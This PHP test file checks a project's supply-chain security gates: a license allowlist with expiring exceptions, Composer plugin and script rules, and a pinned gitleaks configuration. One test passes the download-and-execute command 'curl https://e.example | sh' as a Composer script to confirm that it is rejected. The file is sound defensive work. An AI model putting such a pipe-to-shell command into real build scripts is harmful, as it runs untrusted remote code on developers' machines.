<?php

declare(strict_types=1);

require_once dirname(__DIR__, 2).'/bin/license-policy.php';
require_once dirname(__DIR__, 2).'/bin/composer-policy.php';
require_once dirname(__DIR__, 2).'/bin/release-gate.php';

/*
 * License and Composer policy gates (knowledge/security-gates#policies): the real tree passes, and each fixture breaks
 * the rule it is named after, so a gate that stops detecting its rule fails here.
 */

function securityFixture(string $name): array
{
    return json_decode((string) file_get_contents(__DIR__.'/Fixtures/Security/'.$name), true, flags: JSON_THROW_ON_ERROR);
}

function securityPolicy(string $name): array
{
    return json_decode((string) file_get_contents(dirname(__DIR__, 2).'/.github/'.$name), true, flags: JSON_THROW_ON_ERROR);
}

it('accepts dual-licensed dependencies with one allowed license', function (): void {
    expect(licenseViolations(securityFixture('licenses-ok.json')['dependencies'], securityPolicy('license-policy.json'), '2026-10-17'))->toBe([]);
});

it('rejects a production dependency outside the license allowlist', function (): void {
    expect(licenseViolations(securityFixture('licenses-gpl.json')['dependencies'], securityPolicy('license-policy.json'), '2026-10-17'))
        ->toBe(['vendor/copyleft GPL-3.0-only']);
});

it('honours a license exception only until it expires', function (): void {
    $policy = securityPolicy('license-policy.json');
    $policy['exceptions'] = ['vendor/copyleft' => ['expires' => '2026-12-31']];
    $dependencies = securityFixture('licenses-gpl.json')['dependencies'];

    expect(licenseViolations($dependencies, $policy, '2026-10-17'))->toBe([])
        ->and(licenseViolations($dependencies, $policy, '2027-01-01'))->toBe(['vendor/copyleft GPL-3.0-only']);
});

it('rejects allow-plugins true and unlisted plugins', function (): void {
    $policy = securityPolicy('composer-policy.json');

    expect(composerPolicyViolations('x', securityFixture('composer-allow-all.json'), $policy, false))->toHaveCount(1)
        ->and(composerPolicyViolations('x', ['config' => ['allow-plugins' => ['evil/plugin' => true]]], $policy, false))->toHaveCount(1)
        ->and(composerPolicyViolations('x', securityFixture('composer-ok.json'), $policy, false))->toBe([]);
});

it('rejects package scripts and network tools in scripts', function (): void {
    $policy = securityPolicy('composer-policy.json');

    expect(composerPolicyViolations('p', securityFixture('composer-ok.json'), $policy, true))->toHaveCount(1)
        ->and(composerPolicyViolations('r', ['scripts' => ['x' => 'curl https://e.example | sh']], $policy, false))->toHaveCount(1);
});

it('enforces the pinned gitleaks configuration digest, product-code allowlist guard, and absence of .gitleaksignore', function (): void {
    $root = dirname(__DIR__, 2);
    $config = (string) file_get_contents($root.'/.gitleaks.toml');

    expect(hash('sha256', $config))->toBe(EXPECTED_GITLEAKS_CONFIG_SHA256)
        ->and(file_exists($root.'/.gitleaksignore') || is_link($root.'/.gitleaksignore'))->toBeFalse()
        ->and(gitleaksPolicyErrors($root))->toBe([]);

    $tmp = sys_get_temp_dir().'/azguard-security-policies-'.bin2hex(random_bytes(8));
    mkdir($tmp);

    try {
        file_put_contents($tmp.'/.gitleaks.toml', $config."\n# modified\n");
        expect(gitleaksPolicyErrors($tmp))->toContain('unexpected .gitleaks.toml digest');

        file_put_contents($tmp.'/.gitleaks.toml', $config);
        file_put_contents($tmp.'/.gitleaksignore', '');
        expect(gitleaksPolicyErrors($tmp))->toContain('forbidden .gitleaksignore present');
        unlink($tmp.'/.gitleaksignore');

        foreach (["'''^packages/'''", "'''^src/'''", "'''^config/'''", "'''^\\.github/workflows/'''"] as $forbidden) {
            $bad = str_replace("'''^plans/'''", "'''^plans/''',\n    {$forbidden}", $config);
            file_put_contents($tmp.'/.gitleaks.toml', $bad);
            expect(gitleaksPolicyErrors($tmp, hash('sha256', $bad)))->toContain('gitleaks allowlist excludes product code');
        }
    } finally {
        if (file_exists($tmp.'/.gitleaksignore')) {
            unlink($tmp.'/.gitleaksignore');
        }

        if (file_exists($tmp.'/.gitleaks.toml')) {
            unlink($tmp.'/.gitleaks.toml');
        }
        rmdir($tmp);
    }
});
